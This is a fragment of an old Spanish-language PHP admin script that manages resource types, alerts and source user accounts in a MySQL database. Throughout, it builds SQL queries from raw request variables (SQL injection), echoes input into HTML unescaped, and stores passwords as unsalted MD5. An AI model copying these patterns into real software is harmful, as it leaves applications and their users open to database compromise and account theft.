echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "nueva_tiporecurso") {
  // Agregar Nuevo tiporecurso a Tabla tiporecurso
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables

       // Convertir a May�sculas Nombre del recurso
          $nombrerecurso = strtoupper($nombrerecurso);

       // Chequear en Tabla tiporecurso, existencia de dato a ingresar
        $con_tiporecurso = mysql_query("SELECT idtiporecurso FROM TipoRecurso WHERE idtiporecurso='$nrotiporecurso'") Or DIE("Imposible Relizar Consulta en Tabla TipoRecurso en este Momento ... Intente Nuevamente");

           if ($row=mysql_num_rows($con_tiporecurso) > 0) {
             // tiporecurso Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla tiporecurso
              mysql_query("INSERT INTO TipoRecurso(idtiporecurso,recurso) VALUES('$nrotiporecurso','$nombrerecurso')") or DIE("Imposible Guardar Registro en Tabla TipoRecurso .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado el Siguiente Tipo de Recurso ". $nombrerecurso. " ";
             mensaje_aviso($aviso_accion_ms);

             mysql_free_result($con_tiporecurso);
             mysql_close();
           }
        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


if ($HTTP_GET_VARS['accion']=="edita_tiporecurso"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas Nombre del tiporecurso
     $nombrerecurso = strtoupper($nombrerecurso);

     mysql_query("UPDATE TipoRecurso SET recurso='$nombrerecurso' WHERE idtiporecurso='$id'") or DIE("Imposible Modificar Estado Evento .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=tiporecurso");
   exit;
}
// ----------------------------------------------- <<<    FIN Area Tipo de Recurso    >>> ------------


// ----------------------------------------------- <<<   �rea de Alertas Vigentes >>> ----------
if ($HTTP_GET_VARS['accion'] == "alerta") {

      // Visualizar Registro de Tabla alerta
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraAlertaHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";

/* Limito la busqueda */
$TAMANO_PAGINA = 7;

/* examino la p�gina a mostrar y el inicio del registro a mostrar */
     $pagina = $HTTP_GET_VARS["pagina"];
     if (!$pagina) {
           $inicio = 0;
           $pagina=1;
     }
     else {
           $inicio = ($pagina - 1) * $TAMANO_PAGINA;
     }

           $ssql = "SELECT * FROM alerta";
            $rs = mysql_query($ssql,$myconn);
            $num_total_registros = mysql_num_rows($rs);

            /* calculo el total de p�ginas */
                $total_paginas = ceil($num_total_registros / $TAMANO_PAGINA);

            /* pongo el n�mero de registros total, el tama�o de p�gina y la p�gina que se muestra */

              $maxpags = 4;
              $minimo = $maxpags ? max(1, $pagina-ceil($maxpags/2)): 1;
              $maximo = $maxpags ? min($total_paginas, $pagina+floor($maxpags/2)): $total_paginas;

            /* construyo la sentencia SQL */
                $ssql = "SELECT * FROM alerta LIMIT " . $inicio . "," . $TAMANO_PAGINA;

                $rs = mysql_query($ssql);

                echo('<TABLE WIDTH="100%" BORDER="0" CELLSPACING="0" CELLPADDING="0" class="tablebodytext" bgcolor="#ffffff">');

                while ($fila=mysql_fetch_object($rs))
                {
                  echo "<TR bgcolor=#eaeaea><TD>&nbsp;Fecha: </TD><TD colspan=2 bgcolor=#f7f7f7>&nbsp;<font color=#666666>" . $fila->fecha. "</font></TD></TR>";
                  echo "<TR><td colspan=3 height=1 bgcolor=#ffffff></td></TR>";
				  echo "<TR><TD bgcolor=#eaeaea>&nbsp;Grado:</TD><TD colspan=2 bgcolor=#f7f7f7>&nbsp;<font color=#666666>";
                  if ( $fila->grado == "1" ) {
				       echo "TEMPRANA";
                  } else {
				       echo "AMARILLA";
                  }
				  echo "</font></TD></TR>";
				  
                  echo "<TR><td colspan=3 height=1 bgcolor=#ffffff></td></TR>";
				  echo "<TR><TD bgcolor=#eaeaea>&nbsp;Extensi&oacute;n:</TD><TD colspan=2 bgcolor=#f7f7f7>&nbsp;<font color=#666666>" . $fila->extension. "</font></TD></TR>";
                  echo "<TR><td colspan=3 height=1 bgcolor=#ffffff></td></TR>";
				  echo "<TR><TD bgcolor=#eaeaea>&nbsp;Variable:</TD><TD colspan=2 bgcolor=#f7f7f7>&nbsp;<font color=#666666>" . $fila->variable. "</font></TD></TR>";
                  echo "<TR><td colspan=3 height=5 bgcolor=#ffffff></td></TR>";
echo <<< HTML
                  <TR bgcolor="#c0c0c0">
				           <td colspan=3 >
						     <table broder="1" width="100%" cellpadding="0" cellspacing="1">
							   <tr>
                     			  <td align="center"><a href="$PHP_SELF?accion=modifica_alerta&id=$fila->id"  class="orangenone">Modificar</td>
                                  <td width=1 bgcolor=#ffffff></td>
                                  <td align="center"><a href="$PHP_SELF?accion=borra_alerta&id=$fila->id" class="orangenone">Eliminar</td>
                               </tr>
							 </table>
						   </TD>
				  </TR>
HTML;
                 echo "<TR height=10 bgcolor=#FFFFFF><TD ColSpan=3></TD></TR>";
                }
                echo "</TABLE>";

            /* cerramos el conjunto de resultados y la conexi�n con la base de datos */
                mysql_free_result($rs);
                mysql_close($myconn);

                echo "<p>";

            /* muestro los distintos �ndices de las p�ginas, si es que hay varias p�ginas */

                if($pagina > 1)
               {
                  echo "<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=".($pagina-1)."'>";
                  echo "<font face='verdana' size='-2'> anterior</font>";
                  echo "</a>&nbsp;";
                }

                if ($total_paginas > 1)
               {
                   for ($i=$minimo; $i<$pagina; $i++)
                  {
                     echo "<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=".$i."'> $i &nbsp;</a>&nbsp;";
                   }

                   for ($i=$pagina; $i<=$maximo; $i++)
                  {
                     echo "<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=".$i."'>$i</a>&nbsp;";
                   }
               }

               if($pagina<$total_paginas)
              {
                 echo " &nbsp;<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=" .($pagina+1). "'>";
                 echo "<font face='verdana' size='-2'>siguiente</font></a>";
               }

       echo "</td></tr>";
       echo('<tr><td height=5 ColSpan="2"></td></tr>');
       echo('<tr><td ColSpan="2" valign=middle background="../imagenes/linea.gif"></td></tr>');

       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}



if ($HTTP_GET_VARS['accion'] == "agregar_alerta") {
   // Agregar Alerta
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraAlertaHTML();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega Alerta</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_alerta" name="form">
               <tr align="left" bgcolor="#dde5f2">
                 <td>&nbsp;Fecha:</td>
				 <td bgcolor="#f7f7f7">&nbsp;<input type=text name=fecha size=13 maxlength=10 class=eninput value="dd/mm/aaaa" onfocus="if(this.value=='dd/mm/aaaa')this.value='';" onblur="if(this.value=='')this.value='dd/mm/aaaa';"></td>
				 <td>&nbsp;Hora:</td> 
				 <td bgcolor="#f7f7f7">&nbsp;<input name="hora" type="text" id="hora" value="HH:MM" size="9" maxlength="5" onfocus="if(this.value=='HH:MM')this.value='';" onblur="if(this.value=='')this.value='HH:MM';"  title="Indique La Hora de la Alerta.">
               </tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
			    <td bgcolor="#dde5f2">&nbsp;Grado:</td>
                <td bgcolor="#f7f7f7" colspan="3">&nbsp;<select name="grado" size="1">
				       <option value="--">Seleccione un Grado ...</option> 
				       <option value="1">Temprana</option>
					   <option value="2">Amarilla</option>
				    </select>
				</td>
               </tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
               <tr align="left" bgcolor=#ffffff>
                <td bgcolor="#dde5f2">&nbsp;Extensi&oacute;n:</td>
				 <td bgcolor="#f7f7f7" colspan="3">&nbsp;<input type=text name=extension size=65 maxlength=100 class=eninput></td>
               </tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
               <tr align="left" bgcolor=#ffffff>
                <td bgcolor="#dde5f2">&nbsp;Variable:</td>
				 <td bgcolor="#f7f7f7" colspan="3">&nbsp;<input type=text name=variable size=65 maxlength=100 class=eninput></td>
               </tr>
			   <tr><td height="3" bgcolor="#FFFFFF" colspan="2"></td></tr>
               <tr align="left" ><td colspan="4" bgcolor="#dde5f2">&nbsp;Situaci&oacute;n:</td></tr>
			   <tr><td align="center" bgcolor="#f7f7f7" colspan="4"><textarea name=situacion rows=5 cols=75 class=eninput></textarea></td></tr>
			   <tr><td height="2" bgcolor="#FFFFFF" colspan="2"></td></tr>
               <tr align="left"><td colspan="4"  bgcolor="#dde5f2">&nbsp;Orientaci&oacute;n:</td></tr>
			   <tr><td align="center" bgcolor="#f7f7f7" colspan="4"><textarea name=orientacion rows=5 cols=75 class=eninput></textarea></td></tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
               <tr><td height=15 ColSpan="4"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="4" height="40">
                 <div align="center">
                   <input type="image" name="agregaalerta" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="4" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="4"></td></tr>
              <tr><td ColSpan="4" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


if ($HTTP_GET_VARS['accion'] == "nueva_alerta") {
  // Agregar Nuevo tiporecurso a Tabla tiporecurso
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables

       // Convertir a May�sculas Extension y Variable
          $extension = strtoupper($extension);
          $variable = strtoupper($variable);		  

           // Convertir fecha
              // $tiempo = getdate(); 
                $splfecha = split('[/.-]', $fecha);
                $day = $splfecha[0];
                $month = $splfecha[1];
                $year = $splfecha[2];
                $spltiempo = split('[:]', $hora);
                $hour = $spltiempo[0];
                $minute = $spltiempo[1];
                $second = $spltiempo[2];

              $fecha_act = date("Y-m-d H:i:s",mktime($hour,$minute,$second,$month,$day,$year));


          //Agregar a Tabla Alerta
            mysql_query("INSERT INTO alerta(fecha, grado, extension, variable, situacion, orientacion) VALUES('$fecha_act','$grado', '$extension', '$variable', '$situacion', '$orientacion')") or DIE("Imposible Guardar Registro en Tabla TipoRecurso .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado la Siguiente Alerta <BR>";
			 $aviso_accion_ms  .= "Fecha: ". $fecha_act . "<BR>";
			 $aviso_accion_ms  .= "Grado: ". $grado . "<BR>";
			 $aviso_accion_ms  .= "Extensi&oacute;n: ". $extension . "<BR>";
			 $aviso_accion_ms  .= "Variable: " . $variable . "<BR>";
			 $aviso_accion_ms  .= "Situaci&oacute;n:" . $situacion. "<BR><BR>";
			 $aviso_accion_ms  .= "Orientaci&oacute;n: " . $orientacion . "<BR><BR>";
			 
             mensaje_aviso($aviso_accion_ms);
             mysql_close();
        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


if ($HTTP_GET_VARS['accion']=="edita_alerta"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
    // Chequear Variables

       // Convertir a May�sculas Extension y Variable
          $extension = strtoupper($extension);
          $variable = strtoupper($variable);		  

           // Convertir fecha
                $splfecha = split('[/.-]', $fecha);
                $day = $splfecha[0];
                $month = $splfecha[1];
                $year = $splfecha[2];
                $spltiempo = split('[:]', $hora);
                $hour = $spltiempo[0];
                $minute = $spltiempo[1];
                $second = $spltiempo[2];

              $fecha_act = date("Y-m-d H:i:s",mktime($hour,$minute,$second,$month,$day,$year));

	 
   mysql_query("UPDATE alerta SET fecha='$fecha_act', grado='$grado', extension='$extension', variable='$variable', situacion='$situacion', orientacion='$orientacion' WHERE id='$id'") or DIE("Imposible Modificar Alerta .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=alerta");
   exit;
}

// ----------------------------------------------- <<< FIN �rea Alertas Vigentes >>> ----------


// ----------------------------------------------- <<<    Area de Fuente    >>> ------------
if ($HTTP_GET_VARS['accion'] == "fuente") {

      // Visualizar Registro de Tabla fuente
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraFuenteHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";

/* Limito la busqueda */
$TAMANO_PAGINA = 15;

/* examino la p�gina a mostrar y el inicio del registro a mostrar */
     $pagina = $HTTP_GET_VARS["pagina"];
     if (!$pagina) {
           $inicio = 0;
           $pagina=1;
     }
     else {
           $inicio = ($pagina - 1) * $TAMANO_PAGINA;
     }

           $ssql = "SELECT * FROM FUENTE";
            $rs = mysql_query($ssql,$myconn);
            $num_total_registros = mysql_num_rows($rs);

            /* calculo el total de p�ginas */
                $total_paginas = ceil($num_total_registros / $TAMANO_PAGINA);

            /* pongo el n�mero de registros total, el tama�o de p�gina y la p�gina que se muestra */
//                echo "N�mero de registros encontrados: " . $num_total_registros . "<br>";
//                echo "Se muestran p�ginas de " . $TAMANO_PAGINA . " registros cada una<br>";
//                echo "Mostrando la p�gina " . $pagina . " de " . $total_paginas . "<p>";

              $maxpags = 10;
              $minimo = $maxpags ? max(1, $pagina-ceil($maxpags/2)): 1;
              $maximo = $maxpags ? min($total_paginas, $pagina+floor($maxpags/2)): $total_paginas;

//              echo "Minimo: $minimo <BR>";
//              echo "Maximo: $maximo <BR><p>";


            /* construyo la sentencia SQL */
                $ssql = "SELECT * FROM FUENTE LIMIT " . $inicio . "," . $TAMANO_PAGINA;

//                echo " ".$ssql. "<p>";

                $rs = mysql_query($ssql);

                echo('<TABLE WIDTH="100%" BORDER="0" CELLSPACING="0" CELLPADDING="0" class="tablebodytext" bgcolor="#ffffff">');
                echo('<TR bgcolor=#dde5f2><TD>Nombre Funcionario</TD><TD width=1 bgcolor=#FFFFFF></TD><TD>Cargo</TD><TD width=1 bgcolor=#FFFFFF><TD ColSpan=3></TD></TR>');

                while ($fila=mysql_fetch_object($rs))
                {
                  echo "<TR bgcolor=#f7f7f7><TD><font color=#666666>" . $fila->nombre. "</font></TD>";
                  echo "<td width=1 bgcolor=#ffffff></td>";
                  echo "<TD><font color=#666666>" . $fila->cargo. "</font></TD>";
echo <<< HTML
                  <td width=1 bgcolor=#ffffff></td>
                  <td align=center><a href="$PHP_SELF?accion=modifica_fuente&id=$fila->id"  class="blueunder">Modificar</td>
                  <td width=1 bgcolor=#ffffff></td>
                  <td align=center><a href="$PHP_SELF?accion=borra_fuente&id=$fila->id" class="blueunder">Eliminar</td></TR>
HTML;
                  echo "<TR height=1 bgcolor=#FFFFFF><TD ColSpan=7></TD></TR>";
                }
                echo "</TABLE>";

            /* cerramos el conjunto de resultados y la conexi�n con la base de datos */
                mysql_free_result($rs);
                mysql_close($myconn);

                echo "<p>";

            /* muestro los distintos �ndices de las p�ginas, si es que hay varias p�ginas */

                if($pagina > 1)
               {
                  echo "<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=".($pagina-1)."'>";
                  echo "<font face='verdana' size='-2'> anterior</font>";
                  echo "</a>&nbsp;";
                }

                if ($total_paginas > 1)
               {
                   for ($i=$minimo; $i<$pagina; $i++)
                  {

                     echo "<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=".$i."'> $i </a>&nbsp;";
                   }

                   for ($i=$pagina; $i<=$maximo; $i++)
                  {
                     echo "<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=".$i."'>$i</a>&nbsp;";
                   }
               }

               if($pagina<$total_paginas)
              {
                 echo "&nbsp;<a href='".$HTTP_SERVER["PHP_SELF"]."?accion=fuente&pagina=" .($pagina+1). "'>";
                 echo "<font face='verdana' size='-2'>siguiente </font></a>";
               }

       echo "</td></tr>";
       echo('<tr><td height=5 ColSpan="2"></td></tr>');
       echo('<tr><td ColSpan="2" valign=middle background="../imagenes/linea.gif"></td></tr>');

       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}


if ($HTTP_GET_VARS['accion'] == "agregar_fuente") {
   // Agregar Fuente
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraFuenteHTML();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega Fuente</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_fuente&regId=$regId&provId=$provId&comId=$comId" name="form" onSubmit="return validaFuente();" name="form">
                <td ColSpan=2>
                  <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
                    <tr bgcolor=#dde5f2>
                       <td ColSpan=5 class="topmenu">Origen Fuente</td>
                    <tr>
                    <tr>
                       <td ColSpan=5 height=5 bgcolor=#FFFFFF></td>
                    <tr>
                    <tr bgcolor=#dde5f2>
                       <td>
HTML;

			$sqlReg = "SELECT * FROM Region";
			$xpos = 0;
			if(isset($regId)) {
				$sqlReg.= " WHERE idreg = '$regId'";
                        } else {

                         $IdRegion[$xpos] = "--";
                         $NoRegion[$xpos] = " Seleccione una Regi�n ";
                         $xpos++;
                        }

                        $con_region = mysql_query($sqlReg) or Die("Imposible Realizar Consulta a Tabla Region en estos momento
s ... ha ocurrido un error inesperado .. !!! ");
 
                         while ($row=mysql_fetch_object($con_region)) {
                              $IdRegion[$xpos] = $row->idreg;
                              $NoRegion[$xpos] = $row->region;
                              $xpos++;
                         }
                         mysql_free_result($con_region);
echo <<< HTML
                         <select name="region" class="eninput" onchange="location.href='$PHP_SELF?accion=agregar_fuente&regId='+document.form.region.value"> 
HTML;
                         for($ypos=0; $ypos < $xpos; $ypos++)
                         {
                           echo "<OPTION value='".$IdRegion[$ypos]."'>$NoRegion[$ypos]</OPTION>";
                         }
                         echo "</SELECT>";
echo <<< HTML

                       </td>
                       <td width=1 bgcolor=#ffffff></td>
                       <td >
HTML;
			if(isset($regId)) {
                           $sqlProv = "SELECT * FROM Provincia WHERE idreg = '$regId'";
                        } else {
                           $sqlProv = "SELECT * FROM Provincia";
                        }

                        $xpos = 0;
                        if(isset($provId)) {
                            if(isset($regId)) {
                                $sqlProv.= " AND idpro = '$provId'";
                            } else {
                                $sqlReg.= " WHERE idpro = '$provId'";
                            }
                        } else {

                         $IdProv[$xpos] = "--";
                         $NoProv[$xpos] = " Seleccione una Provincia ";
                         $xpos++;
                        }

                        $con_provincia = mysql_query($sqlProv) or Die("Imposible Realizar Consulta a Tabla Provincia en estos momentos ... ha ocurrido un error inesperado .. !!! ");

                         while ($row=mysql_fetch_object($con_provincia)) {
                              $IdProv[$xpos] = $row->idpro;
                              $NoProv[$xpos] = $row->provincia;
                              $xpos++;
                         }
                         mysql_free_result($con_provincia);
echo <<< HTML
                         <select name="provincia" class="eninput" onchange="location.href='$PHP_SELF?accion=agregar_fuente&regId=$regId&provId='+document.form.provincia.value">
HTML;
                         for($ypos=0; $ypos < $xpos; $ypos++)
                         {
                           echo "<OPTION value='".$IdProv[$ypos]."'>$NoProv[$ypos]</OPTION>";
                         }
                         echo "</SELECT>";
echo <<< HTML
                       </td>
                       <td width=1 bgcolor=#ffffff></td>
                       <td >
HTML;
                        if(isset($provId)) {
                           $sqlComu = "SELECT * FROM Comuna WHERE idpro = '$provId' AND idreg= '$regId'";
                        } else {
                           $sqlComu = "SELECT * FROM Comuna";
                        }

                        $xpos = 0;
                        if(isset($comId)) {
                                $sqlComu.= " AND idcom = '$comId'";
                        } else {

                         $IdComu[$xpos] = "--";
                         $NoComu[$xpos] = " Seleccione una Comuna ";
                         $xpos++;
                        }

                        $con_comuna = mysql_query($sqlComu) or Die("Imposible Realizar Consulta a Tabla Comuna en estos momentos ... ha ocurrido un error inesperado .. !!! ");

                         while ($row=mysql_fetch_object($con_comuna)) {
                              $IdComu[$xpos] = $row->idcom;
                              $NoComu[$xpos] = $row->comuna;
                              $xpos++;
                         }
                         mysql_free_result($con_comuna);
echo <<< HTML
                         <select name="comuna" class="eninput" onchange="location.href='$PHP_SELF?accion=agregar_fuente&regId=$regId&provId=$provId&comId='+document.form.comuna.value">
HTML;
                         for($ypos=0; $ypos < $xpos; $ypos++)
                         {
                           echo "<OPTION value='".$IdComu[$ypos]."'>$NoComu[$ypos]</OPTION>";
                         }
                         echo "</SELECT>";

echo <<< HTML
                       </td>
                    </tr>
                  </table>
               </td>
              </tr>

<!--
//		 echo "RegId: $regId -- ProvId: $provId -- ComId: $comId<BR>";
//		if ($regId > 0) {
//                    if (strlen($regId) == 1) { $regId = "0".$regId; }
//		    $tipo = "REG".$regId;
//		    if ($provId > 0 ) {
//                      if (strlen($provId) == 1) { $provId = "0".$provId; }
//                          $tipo = "PRO".$regId.$provId;
//                    } else { $proId = "00"; }
//                    if ($comId > 0 ) {
//                      if (strlen($comId) == 1) { $comId = "0".$comId; }
//                        $tipo = "COM".$regId.$provId.$comId;
//                    } else { $comId = "00"; }
//                }
//		$fuenteId = $regId.$provId.$comId;
//               if (strlen($fuenteId) == 4) { $fuenteId = $regId."0000"; }
//                echo('<input type="text" name="fuenteId" value="$fuenteId" disabled>');
//		echo('<input type="text" name="tipo" value=$tipo disabled>');
-->

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=15></td>
              </tr>

              <tr  bgcolor=#dde5f2 valign=middle>
                <td width="35%">&nbsp;Nombre</td>
                <td><input type="text" name="nombre" size=35 maxlenght=50 class="eninput"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Username</td>
                <td><input type="text" name="uname" size=20 maxlenght=20 class="eninput"></td>
              </tr>
 
              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Password</td>
                <td><input type="password" name="passw" size=16 maxlenght=16 class="eninput"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Nivel</td>
                <td><input type="text" name="nivel" size=2 maxlenght=2 class="eninput"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Cargo</td>
                <td><input type="text" name="cargo" size=30 maxlenght=30 class="eninput"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Tel&eacute;fono</td>
                <td><input type="text" name="fono" size=15 maxlenght=15 class="eninput" OnKeyPress="return numbersonly(this, event)"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Celular</td>
                <td><input type="text" name="celular" size=10 maxlenght=10 class="eninput" OnKeyPress="return numbersonly(this, event)"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Email</td>
                <td><input type="text" name="email" size=35 maxlenght=50 class="eninput" onChange="return validarEmail(this.form.email.value);"></td>
              </tr>

              <tr bgcolor="#dde5f2" valign=middle>
                 <td ColSpan=2 height=5></td>
              </tr>

               <tr bgcolor="#ffffff" valign=middle>
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregafuente" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


if ($HTTP_GET_VARS['accion'] == "nueva_fuente") {

	$fuenteId = $HTTP_POST_VARS[fuenteId];
    $uname =  $HTTP_POST_VARS[uname];
    $tipo = $HTTP_POST_VARS[tipo];
//                if ($regId > 0) {
                    if (strlen($regId) == 1) { $regId = "0".$regId; }
                    $tipo = "REG".$regId;
                    if ($provId > 0 ) {
                      if (strlen($provId) == 1) { $provId = "0".$provId; }
                          $tipo = "PRO".$regId.$provId;
                    } else { $proId = "00"; }
                    if ($comId > 0 ) {
                      if (strlen($comId) == 1) { $comId = "0".$comId; }
                        $tipo = "COM".$regId.$provId.$comId;
                    } else { $comId = "00"; }
//              }
                $fuenteId = $regId.$provId.$comId;
                if (strlen($fuenteId) == 4) { $fuenteId = $regId."0000"; }


  // Agregar Nueva Fuente a Tabla FUENTE
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables

       // Convertir a May�sculas
          $nombre = strtoupper($nombre);
          $cargo = strtoupper($cargo);

       // Chequear en Tabla FUENTE, existencia de dato a ingresar
// -> Por Modificacion de Campo en Tabla FUENTE, 
//        Se Tomar� la precauci�n de chequear el username, �ste ser� �nico
//        a convenir a futuro

      $con_fuente = mysql_query("SELECT * FROM FUENTE WHERE username='$uname'") Or DIE("Imposible Relizar Consulta en Tabla FUENTE en este Momento ... Intente Nuevamente");

           if ($row=mysql_num_rows($con_fuente) > 0) {
             // Fuente Existe en Tabla
                $error_accion_ms = "El Username que desea incorporar ya Existe..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla FUENTE
              $passw = md5($passw);
              mysql_query("INSERT INTO FUENTE(idfuente,tipofuente,username,password,nivel,nombre,cargo,fono,celular,email) VALUES('$fuenteId','$tipo','$uname','$passw','$nivel','$nombre','$cargo','$fono','$celular','$email')") or DIE("Imposible Guardar Registro en Tabla FUENTE .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado el Siguiente FUENTE". $fuenteId. " ";
             mensaje_aviso($aviso_accion_ms);

           mysql_free_result($con_fuente);
           mysql_close();
           }
        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion']=="edita_fuente"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas
     $nombre = strtoupper($nombre);
     $cargo  = strtoupper($cargo);


     mysql_query("UPDATE FUENTE SET nombre='$nombre', nivel='$nivel', cargo='$cargo', fono='$fono', celular='$celular', email='$email'  WHERE id='$id'") or DIE("Imposible Modificar Fuente .. !!!");
     mysql_close();
     header ("Location: $PHP_SELF?accion=fuente");
     exit;
}
// ----------------------------------------------- <<<    FIN Area Fuente    >>> ------------

?>
